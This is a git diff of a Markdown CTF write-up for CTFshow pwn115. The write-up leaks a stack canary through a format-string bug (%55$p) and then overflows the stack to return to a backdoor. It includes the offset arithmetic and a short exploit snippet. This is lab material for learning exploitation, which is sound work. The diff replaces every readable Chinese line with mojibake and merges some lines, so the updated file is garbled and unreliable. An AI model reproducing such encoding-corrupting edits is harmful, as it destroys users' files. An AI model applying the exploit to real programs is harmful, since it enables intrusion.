@@ -1,30 +1,26 @@
----
-title: CTFshow pwn115 格式化字符串泄露 Canary
+﻿---
+title: CTFshow pwn115 鏍煎紡鍖栧瓧绗︿覆娉勯湶 Canary
 published: 2026-04-17
 updated: 2026-04-17
-description: 先用格式化字符串把 canary 读出来，再构造标准的栈溢出返回后门。
+description: 鍏堢敤鏍煎紡鍖栧瓧绗︿覆鎶?canary 璇诲嚭鏉ワ紝鍐嶆瀯閫犳爣鍑嗙殑鏍堟孩鍑鸿繑鍥炲悗闂ㄣ€
 tags: [CTFshow, Pwn, Stack, Canary, Format String]
 category: ctfshow
 draft: false
 ---
 
-# 题目结论
+# 棰樼洰缁撹
 
-这题是“格式化字符串泄露 + 栈溢出复用”的标准组合。
+杩欓鏄€滄牸寮忓寲瀛楃涓叉硠闇?+ 鏍堟孩鍑哄鐢ㄢ€濈殑鏍囧噯缁勫悎銆?
+鍓嶅崐娈靛厛鐢?`%p` 鎵惧埌 canary 鍦ㄦ爤涓婄殑鍋忕Щ锛屽悗鍗婃鎸夋甯告孩鍑烘柟寮忔妸 canary 鍘熷€煎甫鍥炲幓锛屽氨鍙互瀹夊叏鏀硅繑鍥炲湴鍧€銆?
+## 鍋忕Щ璁＄畻
 
-前半段先用 `%p` 找到 canary 在栈上的偏移，后半段按正常溢出方式把 canary 原值带回去，就可以安全改返回地址。
-
-## 偏移计算
-
-原始笔记给出的计算方式是：
-
+鍘熷绗旇缁欏嚭鐨勮绠楁柟寮忔槸锛?
 ```text
 (0xD4 - 0xC) / 4 + 5 = 55
 ```
 
-所以最终用 `%55$p` 去读 canary。
-
-## 关键 exp 片段
+鎵€浠ユ渶缁堢敤 `%55$p` 鍘昏 canary銆?
+## 鍏抽敭 exp 鐗囨
 
 ```python
 Leak = b'aaaa' + b'%55$p'
@@ -34,17 +30,18 @@ canary = int(p.recv(8), 16)
 payload = b'a' * (0xd4 - 0xc) + p32(canary) + b'a' * 0xc + p32(backdoor)
 ```
 
-## 下载
+## 涓嬭浇
 
-- [下载题目附件 `pwn`](../../attachments/ctfshow/pwn115/pwn)
-- [下载利用脚本 `exp.py`](../../attachments/ctfshow/pwn115/exp.py)
-- [下载原始笔记 `Bypass_pwn115.md`](../../attachments/ctfshow/pwn115/Bypass_pwn115.md)
+- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn115/pwn)
+- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn115/exp.py)
+- [涓嬭浇鍘熷绗旇 `Bypass_pwn115.md`](../../attachments/ctfshow/pwn115/Bypass_pwn115.md)
 
-## 适合记住的点
+## 閫傚悎璁颁綇鐨勭偣
 
-有格式化字符串时，优先想两件事：
+鏈夋牸寮忓寲瀛楃涓叉椂锛屼紭鍏堟兂涓や欢浜嬶細
 
-- 能不能先 leak canary
-- 能不能再 leak libc / 栈地址
+- 鑳戒笉鑳藉厛 leak canary
+- 鑳戒笉鑳藉啀 leak libc / 鏍堝湴鍧€
 
-这类题往往不是把格式化字符串当最终武器，而是把它当“前置情报收集器”。
+杩欑被棰樺線寰€涓嶆槸鎶婃牸寮忓寲瀛楃涓插綋鏈€缁堟鍣紝鑰屾槸鎶婂畠褰撯€滃墠缃儏鎶ユ敹闆嗗櫒鈥濄€?
+
